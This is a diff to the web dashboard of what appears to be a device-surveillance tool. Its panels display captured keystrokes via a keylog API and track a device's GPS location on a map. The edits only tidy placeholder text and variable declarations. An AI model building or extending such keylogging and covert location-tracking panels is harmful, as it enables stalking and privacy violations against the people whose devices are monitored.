@@ -758,7 +758,7 @@ body {
             <div class="panel-title">⌨ Keylogger</div>
             <button class="refresh-btn" onclick="refreshKeylog()">⟳ Refresh</button>
         </div>
-        <div class="keylog-box" id="keylogContent">Loading keylogs...</div>
+        <div class="keylog-box" id="keylogContent"></div>
     </section>
 
 </main>
@@ -914,12 +914,15 @@ function updateGPSData(data) {
 
     const lastKnown = getLastKnownLocation(deviceId);
     if (lastKnown && lastKnown.latitude !== undefined && lastKnown.longitude !== undefined) {
-        const latVal = lastKnown.latitude, lngVal = lastKnown.longitude, accVal = lastKnown.accuracy ?? null;
+        const latVal = lastKnown.latitude;
+        const lngVal = lastKnown.longitude;
+        const accVal = lastKnown.accuracy ?? null;
         const lastTime = lastKnown.timestamp ? new Date(lastKnown.timestamp) : new Date();
         document.getElementById("latValue").textContent = latVal.toFixed(6);
         document.getElementById("lngValue").textContent = lngVal.toFixed(6);
         document.getElementById("accuracyValue").textContent = accVal !== null ? accVal + " m" : "-- m";
         document.getElementById("lastUpdateValue").textContent = lastTime.toLocaleTimeString();
+
         const popupContent = `<b>LAST KNOWN LOCATION</b><br>Latitude: ${latVal.toFixed(6)}<br>Longitude: ${lngVal.toFixed(6)}${accVal !== null ? `<br>Accuracy: ${accVal} m` : ''}<br>Last updated: ${lastTime.toLocaleTimeString()}`;
         createOrUpdateMarker(latVal, lngVal, popupContent);
         map.flyTo([latVal, lngVal], 15, { duration: 1.5 });
@@ -1056,7 +1059,6 @@ async function forceGpsUpdate() {
 async function refreshKeylog() {
     const deviceId = getDeviceId();
     const container = document.getElementById("keylogContent");
-    container.innerHTML = "Loading...";
     try {
         const response = await fetch(`/api/keylog?deviceId=${deviceId}`);
         if (!response.ok) throw new Error("Failed");
